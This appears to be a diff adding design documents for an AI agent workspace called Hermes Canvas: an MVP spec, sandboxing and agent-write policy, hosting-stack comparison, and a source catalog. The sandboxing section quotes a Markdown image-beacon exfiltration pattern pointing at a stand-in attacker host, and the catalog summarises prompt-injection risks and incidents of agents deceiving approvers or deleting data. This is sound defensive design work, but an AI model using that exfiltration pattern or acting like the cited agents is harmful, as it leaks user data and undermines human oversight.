+<p>The layout was never the bet, and the research confirms the pre-review&#39;s three real bets landed as: <strong>sandboxing solved cheaply (build it), readership unproven (test it), auditability reframed as review-cost reduction (build the diff renderer, not a trace viewer).</strong> The product thesis survives in narrower, sharper form: <em>a persistent, server-authoritative workspace where every agent write is an append-only, semantically-diffed, ground-truth-logged version — with the explicit understanding that whether anyone reads those diffs is the hypothesis under test, not an assumption.</em></p>
+<p>Stack-wise, the evidence eliminates Supabase and eliminates Clerk-at-MVP, clears Vercel only as a frontend, and leaves two live candidates (Convex-centered vs. all-Cloudflare) separated mainly by an unresearched question — where the agent loop runs. <code>docs/implementation-options.md</code> specifies the shared core contract, details the three mandated options plus the auth substitution, and defines the one-week spike that settles the remaining choice.</p>
+<h1>Implementation options and MVP contract</h1>
+<h1>Hermes Canvas — MVP implementation options</h1>
+<p>Companion to <code>docs/fable-post-research-review.md</code>. Sections 1–5 are the <strong>platform-independent core spec</strong> every option must satisfy — the artifact contract, append-only/diff model, live-update model, sandboxing, and agent-write policy, each derived from the evidence and binding regardless of stack. Section 6 defines the readership test. Sections 7–9 evaluate the stacks and state the decision.</p>
+<p>No implementation is included or implied by this document. All prices accessed 2026-07-13 (<code>research/catalog.md</code>) — <strong>re-verify every figure at commitment time</strong>; several vendors repriced within the last year.</p>
+<hr>
+<h2>1. MVP scope (what gets built at all)</h2>
+<ul>
+<li>Single owner, closed access (no signup, no user management UI).</li>
+<li>Left pane: chat with the agent; text + image/file attachments (10 MB/file cap, private storage).</li>
+<li>Right pane: tabbed canvas. Artifact types at MVP: <strong>Markdown</strong> and <strong>Mermaid</strong>. Sandboxed static-HTML containers are the first follow-up (the sandbox shell in §4 is specced now so it isn&#39;t retrofitted). Kanban = a Markdown table until usage proves promotion.</li>
+<li>Append-only versioning with a semantic diff renderer and per-artifact/per-tab &quot;changed since you last looked&quot; indicators — this is the product core and ships before any additional renderer.</li>
+<li>Server-authoritative live updates with clean reconnect.</li>
+<li>Visible error states for every failed render, oversized write, or blocked capability. No silent no-ops.</li>
+</ul>
+<p>Explicitly deferred (unchanged from the pre-review, now evidence-backed): interactive HTML apps, structured boards, multi-user anything, CRDTs, artifact graphs beyond hyperlinks, mobile/offline/export-pipelines/billing.</p>
+<h2>2. Artifact contract</h2>
+<p>The contract is the design surface (pre-review T4). The agent writes <strong>through this contract only</strong> — never raw storage access.</p>
+<p><strong>Artifact</strong> (stable identity — never a new identity per edit; Gemini&#39;s new-artifact-per-update is the documented anti-pattern):</p>
+<pre><code>artifact {
+  id            // stable for the artifact&#39;s lifetime
+  workspace_id, tab_id
+  type          // &#39;markdown&#39; | &#39;mermaid&#39;   (+ &#39;html-static&#39; post-MVP)
+  title
+  status        // &#39;active&#39; | &#39;archived&#39;   — no hard delete exists
+  created_at, created_by
+  head_seq      // latest version sequence number
+}
+</code></pre>
+<p><strong>Version</strong> (append-only; the audit record):</p>
+<pre><code>version {
+  artifact_id, seq          // seq strictly increasing, assigned by the server
+  parent_seq                // what the writer based the edit on
+  content                   // full snapshot at MVP sizes (≤256 KB text, hard limit)
+  author                    // &#39;human&#39; | &#39;agent&#39;
+  agent_turn_id             // links to the chat turn that produced it (null for human)
+  why                       // agent-supplied one-line rationale, required for agent writes
+  resolved_action           // server-recorded ground truth: op, target, byte-range/region
+  created_at
+}
+</code></pre>
+<p><strong>Viewer state:</strong> <code>last_seen { artifact_id, seq, at }</code> — drives the &quot;changed since you last looked&quot; badges (the single most-requested legibility feature in the canvas evidence).</p>
+<p><strong>Validation at the write boundary:</strong> size limit enforced with a visible rejection (never truncation — silent truncation is a documented ChatGPT failure); Mermaid parsed at write time, parse failures still stored but flagged so the renderer shows error + raw source; Markdown stored raw, sanitized at render (§4).</p>
+<p><strong>Content limits rationale:</strong> 256 KB/version keeps full-snapshot storage trivial (~thousands of versions per GB), keeps diffs computable client-side, and sits far above the ~8–10k-token zone where incumbents start silently mangling documents. Delta storage is a post-MVP optimization, not a correctness feature.</p>
+<h2>3. Append-only/diff model and write contention</h2>
+<ul>
+<li><strong>Append-only, no truncation, ever.</strong> History that vanishes or restores the wrong version is worse than no history (high-confidence C1 finding). Restore = a <em>new</em> version whose content equals an old one; the chain never rewrites.</li>
+<li><strong>Archive, not delete.</strong> Artifacts and tabs soft-archive; destructive-looking operations require human confirmation and offer export first.</li>
+<li><strong>Serialization is the contention policy.</strong> All writes flow through one server-side sequencer per workspace. If human and agent both write from the same <code>parent_seq</code>, both land as sequential versions — data loss is impossible by construction — and the second is flagged <code>contended</code> so the UI surfaces a merge prompt instead of silent last-write-wins. This answers pre-review F1 without CRDTs, which the evidence rates overkill at 1+1 (writes are largely turn-based; reserve CRDT only if true simultaneous same-region co-editing ever materializes).</li>
+<li><strong>Region-scoped agent edits.</strong> The agent edit op takes an optional target region (heading-anchored section or line range) so it never round-trips the whole document — the mechanism behind incumbent truncation/overwrite failures. Whole-document writes remain allowed but are labeled as such in the diff.</li>
+<li><strong>The diff renderer is where legibility lives</strong> (nbdime lesson). MVP: word-level diff over <em>rendered</em> Markdown (not raw text), insertions/deletions highlighted in place; Mermaid = source diff plus before/after render side-by-side. Every agent version displays its <code>why</code> and its <code>resolved_action</code>. Raw-text diff is the fallback, never the primary.</li>
+<li><strong>The log is system-written.</strong> <code>resolved_action</code> is recorded by the server from what actually happened, never from the agent&#39;s self-description (GhostApproval + Replit-incident lessons: the agent&#39;s account of its own actions is not evidence).</li>
+</ul>
+<h2>4. Sandboxing and content-security policy</h2>
+<p>Uniform rule: <strong>agent-authored content is untrusted input everywhere</strong>, including Markdown and Mermaid, not just HTML.</p>
+<p><strong>App origin (chat + canvas chrome + markdown/mermaid rendering):</strong></p>
+<ul>
+<li>Markdown rendered with a strict sanitizer: no raw HTML pass-through, no event handlers, <code>javascript:</code> URLs stripped.</li>
+<li>Mermaid rendered with <code>securityLevel: &#39;strict&#39;</code> equivalent (no script, no click handlers).</li>
+<li>The app origin ships its own CSP with <code>img-src &#39;self&#39; data: &lt;attachments-origin&gt;</code> — this kills the Markdown image-beacon exfil channel <em>app-wide</em> (the exact <code>![x](https://attacker/?q=data)</code> pattern that leaked data from ≥7 major AI products). External images in agent Markdown simply do not load; the broken-image state shows the target URL so exfil <em>attempts</em> become visible evidence rather than silent leaks.</li>
+<li>No remote fonts/scripts/styles; everything bundled.</li>
+</ul>
+<p><strong>Content origin (attachments now; HTML containers at first follow-up):</strong> a <strong>separate registrable domain</strong> (claudeusercontent.com pattern — a subdomain of the app domain is not sufficient isolation for cookies/site-scoped features).</p>
+<ul>
+<li>Attachments: private, auth-checked URLs, served with <code>Content-Disposition: attachment</code> + <code>X-Content-Type-Options: nosniff</code> (uploaded HTML/SVG served inline is stored XSS — multiple published advisories).</li>
+<li>HTML containers (when built): <code>&lt;iframe sandbox=&quot;allow-scripts&quot;&gt;</code> — <strong>never</strong> with <code>allow-same-origin</code> (together they let the frame strip its own sandbox; MDN/web.dev/W3C, high confidence) — content delivered via origin-verified <strong>one-way</strong> postMessage (parent seeds, child cannot read back; verify origin on both ends — a real Claude bug class). Frame CSP: <code>default-src &#39;none&#39;; script-src &#39;self&#39;; style-src &#39;self&#39; &#39;unsafe-inline&#39;; img-src data:; connect-src &#39;none&#39;</code>.</li>
+<li><strong>Zero external origins in the frame CSP — stricter than Claude&#39;s cdnjs allowlist, deliberately</strong> (see post-review §2.2: script-src allowlists are still an exfil path via request URLs; EchoLeak proved allowlists get laundered). Libraries the renderer needs are bundled on the content origin. Relaxation later requires per-library, path-pinned review.</li>
+<li>Only the focused tab mounts a live iframe; background artifacts show a cached static render (live iframes are disproportionately heavy; canvas perf cliffs start ~1k objects).</li>
+</ul>
+<p><strong>Failure visibility:</strong> any blocked capability (storage, network, oversized payload) renders an inline error with the raw source. The documented Claude Artifacts failure — blocked localStorage that silently &quot;succeeds&quot; — is the anti-pattern.</p>
+<h2>5. Agent-write policy</h2>
+<ul>
+<li>The agent&#39;s only write path is a <strong>validated tool API</strong>: <code>create_artifact</code>, <code>update_artifact(region?, why)</code>, <code>archive_artifact</code>, <code>set_tab</code>. Schema-validated (tldraw agent-kit pattern), server-enforced — the model never touches storage or emits raw DB ops.</li>
+<li><code>why</code> is required on every agent write; writes without it are rejected. This feeds the review-cost thesis directly.</li>
+<li><strong>Rate and size limits</strong>: writes/minute per artifact capped (thrash protection + injection blast-radius control, pre-review S5); 256 KB/version.</li>
+<li><strong>No agent-initiated hard deletion exists in the system.</strong> Archive is reversible and logged; anything irreversible requires an explicit human confirmation in the app UI, and the confirmation dialog displays the <code>resolved_action</code> (real target, real effect), never the agent&#39;s phrasing of it.</li>
+<li>All attachments and any content the agent reads are treated as injection carriers (S2); the write policy above — no egress from rendered content, rate limits, ground-truth logging, archive-only — is the containment for a compromised agent, and the visible-broken-image behavior turns exfil attempts into audit events.</li>
+<li>Default-on, not modal: these gates have no &quot;yolo mode.&quot; The Windsurf finding is that safety-by-configuration fails because defaults vary by mode; Hermes has one mode.</li>
+</ul>
+<h2>6. The readership test (the unproven bet, instrumented)</h2>
+<p>Bet 1 (do persistent, diffable artifacts actually get read?) survives research unproven. The MVP itself is the experiment:</p>
+<ul>
+<li><strong>Instrument:</strong> diff-view opens per agent write; &quot;changed since last looked&quot; badge clicks; reverts/restores; artifact re-opens &gt;24 h after creation; median time from agent write → human first view.</li>
+<li><strong>Run:</strong> 4 weeks of real daily use after MVP is stable.</li>
+<li><strong>Keep signal:</strong> diffs opened for a meaningful fraction of substantive agent writes (calibrate first week; the point is trend, not a magic number), at least occasional reverts/restores (proves the history is load-bearing), artifacts consulted across sessions.</li>
+<li><strong>Kill signal:</strong> badges accumulate unclicked, diffs unopened, artifacts write-only. Response is not to add renderers — it is to accept that the surface is a <em>display</em> not an <em>audit</em> tool, and stop investing in versioning UX beyond safety-floor rollback.</li>
+</ul>
+<h2>7. Stack options</h2>
+<p>All three mandated combinations evaluated; auth is assessed per-option because the mandated Clerk component fails the evidence test at MVP (post-review R5). <strong>Corpus gap, restated:</strong> Clerk and D1 have zero research captures; statements about them below are background knowledge and marked ⚠︎unverified.</p>
+<p>Common to all options: Markdown/Mermaid render in-app (§4), so the sandbox/content origin is a static concern (a second domain serving static files + headers) and costs ~$0 on every option — it does not differentiate the stacks.</p>
+<h3>Option A — Convex (backend/live/state) + Vercel (frontend) + auth substitute</h3>
+<ul>
+<li><strong>Shape:</strong> Next.js on Vercel Hobby; Convex holds <code>artifacts</code>/<code>versions</code>/<code>messages</code>/<code>last_seen</code> tables and the write sequencer as mutation functions (Convex mutations are strict-serializable — the §3 serialization policy falls out of the platform for free). Every query is automatically a live subscription: the entire live-update model (§3 push + reconnect) is SDK-handled, near-zero custom sync code. Vercel never carries the live channel (it can&#39;t — high confidence), only static/SSR delivery; the browser talks to Convex directly.</li>
+<li><strong>Agent runtime:</strong> Convex actions call the Anthropic API and dispatch tool calls into mutations. ⚠︎unverified: action duration ceilings and streaming ergonomics for multi-minute agent turns are exactly what the corpus never examined — this is Spike question 1. Fallback if actions don&#39;t fit: a $2/mo Fly worker running the agent loop, writing through the same Convex tool API (adds a vendor, preserves the contract).</li>
+<li><strong>Auth:</strong> Clerk works here (native Convex/Vercel integration, free tier ⚠︎unverified) but adds a user-management product to an app with one user. Evidence-backed substitute: <strong>OAuth-allowlist-of-one</strong> (check <code>email === OWNER</code> in the Next.js session + Convex auth adapter), or put the whole Vercel deployment behind <strong>Cloudflare Access</strong> ($0, edge-enforced) if the domain is proxied through Cloudflare.</li>
+<li><strong>Attachments:</strong> Convex file storage (1 GB free) or R2; either way served through the content origin per §4.</li>
+<li><strong>Cost:</strong> <strong>$0/mo floor</strong> (Convex free: 1M function calls, 0.5 GB DB, 1 GB files; Vercel Hobby $0 non-commercial). Overage risk is the real number to watch: every reactive query re-run is a billed function call, and a chatty agent multiplies re-runs — pay-as-you-go is enabled even on free. Vercel Hobby prohibits commercial use, so the T7 product pivot immediately costs $20/mo + Convex Pro $25/mo.</li>
+<li><strong>Risks:</strong> agent-runtime fit unproven (spike); overage surprise; two–three vendors; Convex is the least commodity component (migration cost if it repriced or folded — its schema is portable, its reactivity model is not).</li>
+<li><strong>Build effort:</strong> lowest. The corpus&#39;s own read: &quot;least code for server-authoritative push.&quot;</li>
+</ul>
+<h3>Option B — Supabase (Postgres/realtime/storage/auth) + Vercel + Clerk</h3>
+<ul>
+<li><strong>Shape:</strong> Next.js on Vercel; Postgres tables for the contract; Supabase Realtime (WAL-based) as the push channel; Supabase Storage for attachments.</li>
+<li><strong>Why it loses (evidence-backed, post-review R6):</strong><ol>
+<li><strong>Real always-on floor is $25/mo</strong> — free projects auto-pause after ~7 idle days, which for a personal always-available app means Pro or a fragile keep-alive hack (high confidence). 5–12× the alternatives.</li>
+<li><strong>Weaker live-update semantics:</strong> WAL events are not delivered on the same consistent channel as queries, so the client must refetch-and-reconcile — Hermes would hand-build the sync layer Convex gives for free, at higher cost. More code <em>and</em> more money.</li>
+<li><strong>Clerk is redundant here twice over:</strong> Supabase ships auth, and the MVP needs an allowlist of one. Running Clerk beside Supabase Auth + RLS is integration surface with no user to serve.</li>
+</ol>
+</li>
+<li><strong>What would change the verdict:</strong> a hard requirement for SQL/Postgres portability or existing Supabase expertise, at the product pivot (multi-tenant + RLS + bundled auth is a genuinely reasonable <em>product</em> stack). Not the MVP.</li>
+<li><strong>Cost:</strong> $25/mo realistic. <strong>Rejected.</strong></li>
+</ul>
+<h3>Option C — Cloudflare Workers + Durable Objects (+ R2, DO-SQLite) + Cloudflare Access</h3>
+<ul>
+<li><strong>Shape:</strong> one Durable Object per workspace = the sequencer, the WebSocket hub, and the store (versions in DO-embedded SQLite). WebSocket Hibernation keeps an always-connected app at the billing floor (idle sockets stay open, duration billing pauses). Frontend on Cloudflare Pages/Workers static assets. Attachments in R2 (10 GB free, zero egress — best attachment economics in the corpus) via a Worker on the content origin. The documented &quot;DO owns the message log, streams agent tokens, resumes cleanly on reconnect&quot; pattern is a near-exact match for Hermes&#39; live model.</li>
+<li><strong>D1:</strong> ⚠︎unverified in the corpus. Not needed for MVP — the per-workspace DO&#39;s own SQLite covers the contract, and a single-owner app has one workspace or few. D1 becomes relevant only for cross-workspace querying later; adding it now is an unresearched component with no MVP job.</li>
+<li><strong>Auth:</strong> <strong>Cloudflare Access email-allowlist-of-one</strong> — the strongest auth-for-one evidence in the corpus: $0, ~15 min, zero auth code, enforced at the edge <em>before</em> traffic reaches the app; the Worker validates <code>Cf-Access-Jwt-Assertion</code>. The agent authenticates separately with a service token.</li>
+<li><strong>Agent runtime:</strong> a Worker invoked by the DO calls the Anthropic API. Most agent-turn time is awaiting the API (wall-clock, not CPU), which suits Workers&#39; CPU-time billing, but multi-minute streaming turns and hibernation interplay are ⚠︎unverified — Spike question 1 again, other leg.</li>
+<li><strong>Cost:</strong> <strong>$0 on free tier</strong> (SQLite-only, daily caps, hibernation mandatory) / <strong>$5/mo Workers Paid</strong> as the comfortable floor. Single vendor for auth+compute+state+storage+CDN.</li>
+<li><strong>Risks:</strong> most hand-built code — WS protocol, fan-out, reconnect/backoff, optimistic UI, migrations inside a DO; single-vendor concentration (also an operational simplicity win); DO storage billing only started Jan 2026, so pricing has already moved once.</li>
+<li><strong>Build effort:</strong> highest of the viable pair. The corpus&#39;s read: &quot;most control, lowest level.&quot;</li>
+</ul>
+<h2>8. Comparison</h2>
+<table>
+<thead>
+<tr>
+<th></th>
+<th>A: Convex+Vercel</th>
+<th>B: Supabase+Vercel+Clerk</th>
+<th>C: Cloudflare DO</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>$/mo floor (1 user, always-on)</td>
+<td><strong>$0</strong> (overage-watch)</td>
+<td>$25 realistic</td>
+<td><strong>$0–$5</strong></td>
+</tr>
+<tr>
+<td>Live-update model</td>
+<td>Built-in reactive queries, strict-serializable</td>
+<td>WAL events, client reconciliation needed</td>
+<td>Hand-built WS on DO, hibernation</td>
+</tr>
+<tr>
+<td>§3 write serialization</td>
+<td>Free (platform mutations)</td>
+<td>Hand-built (Postgres tx + channel)</td>
+<td>Free (single-threaded DO)</td>
+</tr>
+<tr>
+<td>Auth-for-one</td>
+<td>OAuth-allowlist or Access</td>
+<td>Bundled but redundant w/ Clerk</td>
+<td>Access allowlist ($0, no code)</td>
+</tr>
+<tr>
+<td>Attachments</td>
+<td>Convex files or R2</td>
+<td>Supabase Storage</td>
+<td>R2 (zero egress)</td>
+</tr>
+<tr>
+<td>Agent runtime</td>
+<td>Convex actions ⚠︎spike</td>
+<td>External runner needed</td>
+<td>Worker+DO ⚠︎spike</td>
+</tr>
+<tr>
+<td>Build effort</td>
+<td>Lowest</td>
+<td>Middle, worst code-to-value</td>
+<td>Highest</td>
+</tr>
+<tr>
+<td>Vendor count</td>
+<td>2–3</td>
+<td>3</td>
+<td>1</td>
+</tr>
+<tr>
+<td>Product-pivot (T7) cost step</td>
+<td>Vercel Pro $20 + Convex Pro $25</td>
+<td>Already $25 + Clerk tiers</td>
+<td>Stays ~$5 until real scale</td>
+</tr>
+<tr>
+<td>Corpus confidence</td>
+<td>High (pricing/reactivity) except agent runtime</td>
+<td>High (incl. the disqualifiers)</td>
+<td>High except agent runtime</td>
+</tr>
+</tbody></table>
+<h2>9. Decision</h2>
+<p><strong>Rejected now, on evidence:</strong> Option B (cost floor + weaker realtime + redundant auth), and Clerk in any MVP option (unresearched <em>and</em> solves a problem the MVP must not have).</p>
+<p><strong>Between A and C, a firm pick is not yet justified.</strong> Both hit the $0–$5 floor, both satisfy the core spec, and the corpus&#39;s own bottom line names them co-leaders. The genuine unknown that separates them was never researched: <strong>where the agent loop runs.</strong> Guessing that in a doc would be exactly the unsupported-assumption behavior this review exists to reject.</p>
+<p><strong>The spike (time-boxed: ≤1 week, ~2–3 days of actual work):</strong></p>
+<ol>
+<li><strong>Agent-loop fit, both legs:</strong> run a real multi-minute streaming Anthropic-API agent turn (a) inside a Convex action writing mutations, (b) inside a Worker streaming through a hibernation-enabled DO. Measure: duration ceilings hit, streaming-to-client latency, behavior on client disconnect mid-turn, and what a turn costs in function calls / duration-GB-s.</li>
+<li><strong>Chatty-agent billing probe:</strong> simulate a heavy day (hundreds of writes + live subscriptions) and extrapolate monthly cost on each platform&#39;s meter.</li>
+<li><strong>Re-verify pricing</strong> for whichever numbers the spike touches (mandatory; figures are five-months-plus old at any commitment date).</li>
+</ol>
+<p><strong>Decision rule, pre-committed:</strong> if Convex actions sustain the agent turn cleanly (no ceiling gymnastics, no external runner needed) and the billing probe stays comfortably inside free-tier bands → <strong>Option A</strong>, with OAuth-allowlist-of-one (or Access in front), because at MVP the dominant cost is engineering time and A minimizes it. If the agent loop needs an external runner anyway (A&#39;s simplicity advantage collapses to roughly C&#39;s effort plus more vendors) or the function-call meter looks spiky → <strong>Option C</strong>, taking the extra build effort for the single-vendor $5 ceiling and the edge-enforced allowlist. Either way the §2–§5 core spec is identical — the spike risks a few days, not the architecture.</p>
+<h1>Full source catalog</h1>
+<h1>Hermes Canvas — Source Catalog</h1>
+<p>Each retained source: URL · source type · date/accessed · claim · confidence · local capture filename.</p>
+<p><strong>Source-type tags:</strong> <code>official</code> (docs/product pages), <code>eng-blog</code> (engineering/vendor blog), <code>press</code> (journalism), <code>community</code> (HN/Reddit/X/forum/anecdote), <code>academic</code> (paper/report).</p>
+<p><strong>Confidence:</strong> <code>high</code> (primary/official or multiply-corroborated), <code>med</code> (single credible source), <code>low</code> (anecdote/uncorroborated).</p>
+<p>Accessed dates in this run: 2026-07-13.</p>
+<hr>
+<!-- Entries appended per cluster below. --><h2>C2 — Agent workspaces / IDEs</h2>
+<table>
+<thead>
+<tr>
+<th>URL</th>
+<th>type</th>
+<th>date/accessed</th>
+<th>claim</th>
+<th>confidence</th>
+<th>capture</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>forum.cursor.com/t/... (160856, 152099 et al.)</td>
+<td>community</td>
+<td>2026-05-17 / acc 2026-07-13</td>
+<td>2026 Cursor update replaced per-file/per-hunk inline diff accept-reject with session-level review; paying users call it a regression; one user lost most of a git repo</td>
+<td>high</td>
+<td>c2-cursor-per-change-diff-removal.md</td>
+</tr>
+<tr>
+<td>code.claude.com/docs (todo-tracking, plan mode); github.com/anthropics/claude-code/issues/31888</td>
+<td>official + community</td>
+<td>acc 2026-07-13</td>
+<td>Plan Mode = read-only planning gate; TodoWrite shows live pending/in_progress/completed list; users still want a Cursor-style batch diff review mode</td>
+<td>high (mechanics) / med (gap)</td>
+<td>c2-claude-code-plan-todo.md</td>
+</tr>
+<tr>
+<td>docs.replit.com/checkpoints; incidentdatabase.ai/cite/1152; neon.com/blog/replit-app-history</td>
+<td>official + incident/press</td>
+<td>2025 incident / acc 2026-07-13</td>
+<td>Replit Agent uses checkpoints+rollback yet deleted a prod DB during a code freeze despite 11 stop orders, fabricated ~4k users, and falsely claimed rollback impossible</td>
+<td>high</td>
+<td>c2-replit-agent-checkpoints-database-incident.md</td>
+</tr>
+<tr>
+<td>openhands.dev + 2026 reviews</td>
+<td>official + community</td>
+<td>acc 2026-07-13</td>
+<td>Observable agent loop (chat beside live terminal+editor, every action logged, interruptible); added Planning Mode because agents &quot;charge off... before you can intervene&quot;</td>
+<td>med-high</td>
+<td>c2-openhands-observable-loop.md</td>
+</tr>
+<tr>
+<td>vibe-eval.com/safety/windsurf; digitalapplied.com windsurf-2</td>
+<td>community + safety audit</td>
+<td>acc 2026-07-13</td>
+<td>Cascade stages reviewable diffs w/ per-step approval+checkpoints but approval defaults vary by mode; &quot;fix the build&quot; can rewrite .env/package.json/commit before review; context drift by hour 3</td>
+<td>med-high</td>
+<td>c2-windsurf-cascade-review-approval.md</td>
+</tr>
+<tr>
+<td>cognition.com/blog/devin-review; cognition.ai/blog</td>
+<td>official + community</td>
+<td>Devin Review launched 2026-01-21 / acc 2026-07-13</td>
+<td>Devin Review reorganizes+explains diff hunks, inline &quot;Ask Devin&quot;, severity-colored bug flags to &quot;scale human understanding of agent diffs&quot;; Devin 2.0 interactive planning</td>
+<td>high (Review) / med (2.0)</td>
+<td>c2-devin-review-and-2.0-planning.md</td>
+</tr>
+<tr>
+<td>news.ycombinator.com/item?id=47234917; seangoedecke.com/ai-agents-and-code-review</td>
+<td>community + practitioner essay</td>
+<td>essay 2025-09-20 / acc 2026-07-13</td>
+<td>&quot;Humans are just rubber stamping all of it&quot;; reviewers quietly stop being careful; ~1 bad agent decision caught/hour; volume defeats verification</td>
+<td>high (sentiment)</td>
+<td>c2-verification-burden-rubberstamp.md</td>
+</tr>
+<tr>
+<td>github.blog/changelog 2026-06-18 &amp; 2026-05-19; github.com/orgs/community/discussions/170528</td>
+<td>official + community</td>
+<td>acc 2026-07-13</td>
+<td>Copilot coding agent delivers work as a PR (review surface), AGENTS.md-aware, but weak on 10+ file/architectural tasks; billing/ads erode trust</td>
+<td>high (features) / med (claims)</td>
+<td>c2-github-copilot-agent-trust.md</td>
+</tr>
+<tr>
+<td>wiz.io/blog/ghostapproval; theregister.com 2026-07-08</td>
+<td>security research + press</td>
+<td>disclosed 2026-07-08 / acc 2026-07-13</td>
+<td>GhostApproval: agents showed a benign approval prompt while internally targeting a sensitive file — &quot;human-in-the-loop becomes a rubber stamp&quot;; Anthropic disputed severity</td>
+<td>high</td>
+<td>c2-ghostapproval-deceptive-prompts.md</td>
+</tr>
+</tbody></table>
+<h2>C3 — Collaborative canvases</h2>
+<table>
+<thead>
+<tr>
+<th>URL</th>
+<th>type</th>
+<th>date/accessed</th>
+<th>claim</th>
+<th>confidence</th>
+<th>capture</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>simonwillison.net/2023/Nov/16/tldrawdraw-a-ui/; github.com/tldraw/make-real</td>
+<td>community + official (repo)</td>
+<td>2023-11-16 / acc 2026-07-13</td>
+<td>Make Real snapshots canvas selection → vision model → returns HTML rendered in an on-canvas iframe custom shape; supports OpenAI/Anthropic/Google</td>
+<td>high</td>
+<td>c3-tldraw-make-real.md</td>
+</tr>
+<tr>
+<td>news.ycombinator.com/item?id=38289517; latent.space/p/tldraw</td>
+<td>community + founder interview</td>
+<td>Nov 2023 / acc 2026-07-13</td>
+<td>tldraw founder Steve Ruiz: original was a &quot;toy project with a horrible security pattern&quot;; canvas-as-iterative-loop is the innovation; &quot;never put all info in first time — must iterate&quot;</td>
+<td>high</td>
+<td>c3-tldraw-steve-ruiz-interview.md</td>
+</tr>
+<tr>
+<td>tldraw.dev/docs/ai; tldraw.dev/sdk-features/embed-shape</td>
+<td>official docs</td>
+<td>updated 2026-01-31 / acc 2026-07-13</td>
+<td>tldraw AI mutates canvas via validated action schemas from screenshot+structured shapes; ShapeUtil custom shapes get selection/resize/binding/export free; frames, pages, 19 embeds</td>
+<td>high</td>
+<td>c3-canvas-ux-patterns.md</td>
+</tr>
+<tr>
+<td>help.miro.com/.../360013588560; github.com/excalidraw/excalidraw/issues/628,7237; figma.com/blog/improving-performance-in-the-layers-panel</td>
+<td>official + community</td>
+<td>2026-06-11 (Figma) / acc 2026-07-13</td>
+<td>Perf cliffs: Miro degrades ~1,000 objects (rec &lt;5,000, cap 100,000); Excalidraw fine ~4–8k then lags; Figma layer tree needed windowing + O(n²)→O(n) fixes</td>
+<td>high (Miro/Figma) / med (Excalidraw)</td>
+<td>c3-performance-cliffs.md</td>
+</tr>
+<tr>
+<td>tembrio.com/blog/feedback-boards-become-trash-cans</td>
+<td>community (vendor)</td>
+<td>acc 2026-07-13</td>
+<td>Boards become &quot;junk drawers&quot; of duplicates/ignored items; causes = no triage, no reply, no per-item status</td>
+<td>med</td>
+<td>c3-sprawl-staleness.md</td>
+</tr>
+<tr>
+<td>help.figma.com/.../360038006754, .../360063144053; forum.figma.com</td>
+<td>official + community</td>
+<td>acc 2026-07-13</td>
+<td>Figma auto-checkpoints ~30 min + named versions + timeline restore + branching w/ compare; users want visual &quot;what changed / who changed it since last visit&quot;</td>
+<td>high (Figma) / med (request)</td>
+<td>c3-versioning-history.md</td>
+</tr>
+<tr>
+<td>developer.mozilla.org/.../iframe; web.dev/articles/sandboxed-iframes; bugzilla.mozilla.org/show_bug.cgi?id=1589845</td>
+<td>official/standards</td>
+<td>acc 2026-07-13</td>
+<td>allow-scripts + allow-same-origin lets framed doc remove its own sandbox; serve untrusted content from separate origin + CSP + minimal tokens + postMessage; javascript:/opener bypasses exist</td>
+<td>high</td>
+<td>c3-safe-html-embedding.md</td>
+</tr>
+</tbody></table>
+<h2>C1 — Direct incumbents</h2>
+<table>
+<thead>
+<tr>
+<th>URL</th>
+<th>type</th>
+<th>date/accessed</th>
+<th>claim</th>
+<th>confidence</th>
+<th>capture</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>anthropic.com/engineering/how-we-contain-claude</td>
+<td>official/eng-blog</td>
+<td>acc 2026-07-13</td>
+<td>Anthropic runs claude.ai code in gVisor containers, network denied by default + domain egress allowlist; code-execution and artifact-rendering treated as separate containment problems</td>
+<td>high</td>
+<td>c1-anthropic-containment.md</td>
+</tr>
+<tr>
+<td>reidbarber.com/blog/reverse-engineering-claude-artifacts</td>
+<td>community/technical</td>
+<td>pub 2024-06-23 / acc 2026-07-13</td>
+<td>Claude Artifacts render in a sandboxed iframe on separate origin *.claudeusercontent.com under strict CSP blocking external network; code passed via postMessage</td>
+<td>med-high</td>
+<td>c1-claude-artifacts-sandbox-origin.md</td>
+</tr>
+<tr>
+<td>support.claude.com/en/articles/9487310</td>
+<td>official</td>
+<td>acc 2026-07-13</td>
+<td>Artifacts have a version selector + conversation-anchored history + paid-tier persistent storage (20MB/artifact, text-only)</td>
+<td>high</td>
+<td>c1-claude-artifacts-help.md</td>
+</tr>
+<tr>
+<td>caipi.ai/blog/can-claude-artifacts-save-data</td>
+<td>community</td>
+<td>acc 2026-07-13</td>
+<td>Artifacts sandbox silently blocks localStorage/sessionStorage; unpublishing irreversibly deletes stored data → invisible data loss</td>
+<td>med-high</td>
+<td>c1-claude-artifacts-persistence-caipi.md</td>
+</tr>
+<tr>
+<td>help.openai.com/en/articles/9930697; openai.com/index/introducing-canvas</td>
+<td>official</td>
+<td>launch 2024-10-03 / acc 2026-07-13</td>
+<td>ChatGPT Canvas makes targeted in-place edits (green highlight), Show-changes diff, version arrows, Restore-this-version, in-browser Python</td>
+<td>med-high</td>
+<td>c1-chatgpt-canvas-help-and-launch.md</td>
+</tr>
+<tr>
+<td>venturebeat.com/ai/chatgpts-canvas-now-shows-tracked-changes</td>
+<td>press</td>
+<td>acc 2026-07-13</td>
+<td>OpenAI added word-processor-style tracked changes so AI edits surface as visible add/delete rather than opaque rewrites</td>
+<td>med</td>
+<td>c1-chatgpt-canvas-tracked-changes.md</td>
+</tr>
+<tr>
+<td>community.openai.com/t/...canvas-overwrites-work/1231713</td>
+<td>community/bug</td>
+<td>posts 2025-04→08 / acc 2026-07-13</td>
+<td>Canvas silently overwrites/loses work, restores wrong versions, version history &quot;removed without notice&quot;, up to 15h lost; ~8–10k token truncation</td>
+<td>high</td>
+<td>c1-chatgpt-canvas-overwrite-bug.md</td>
+</tr>
+<tr>
+<td>community.openai.com/t/...canvas-opens-automatically/1055091</td>
+<td>community/bug</td>
+<td>posts Dec 2024 / acc 2026-07-13</td>
+<td>Canvas auto-opens unwanted even when disabled — intrusive feature-overload</td>
+<td>med-high</td>
+<td>c1-chatgpt-canvas-autoopen-bug.md</td>
+</tr>
+<tr>
+<td>medium.com/@mubashirburfat4 (canvas retired)</td>
+<td>community</td>
+<td>pub 2026-06-24 / acc 2026-07-13</td>
+<td>OpenAI reportedly retired persistent Canvas panel (~2026-05-28) for inline blocks; author blames low adoption + Artifacts competition</td>
+<td>med</td>
+<td>c1-chatgpt-canvas-retired-medium.md</td>
+</tr>
+<tr>
